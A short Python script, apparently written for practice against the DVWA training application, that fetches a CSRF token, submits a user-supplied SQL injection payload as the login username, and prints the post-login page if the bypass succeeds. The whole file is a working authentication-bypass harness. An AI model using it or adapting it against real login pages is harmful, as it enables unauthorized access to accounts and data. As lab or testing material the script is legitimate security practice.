#!/usr/bin/env python3
"""DVWA 登录 SQLi 绕过尝试: 对 login.php 注入用户名, 带 CSRF token.
用法: python3 dvwa_login_sqli.py <base_url> <username_payload> <password>
"""
import re, sys, urllib.request, http.cookiejar

base, user, pwd = sys.argv[1], sys.argv[2], sys.argv[3]
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def get_token():
    html = opener.open(base + "/login.php", timeout=10).read().decode(errors="replace")
    m = re.search(r"name='user_token'\s+value='([0-9a-f]+)'", html)
    return m.group(1) if m else None

token = get_token()
data = urllib.parse.urlencode({"username": user, "password": pwd,
                               "Login": "Login", "user_token": token}).encode()
resp = opener.open(base + "/login.php", data=data, timeout=10)
body = resp.read().decode(errors="replace")
ok = "Login failed" not in body
print("SQLi payload:", repr(user), "| login ok:", ok)
if ok:
    # 尝试访问 index.php
    r = opener.open(base + "/index.php", timeout=10)
    print("index status:", r.status, "| url:", r.geturl())
    if r.geturl().endswith("index.php"):
        html = r.read().decode(errors="replace")
        print(html[:3000])
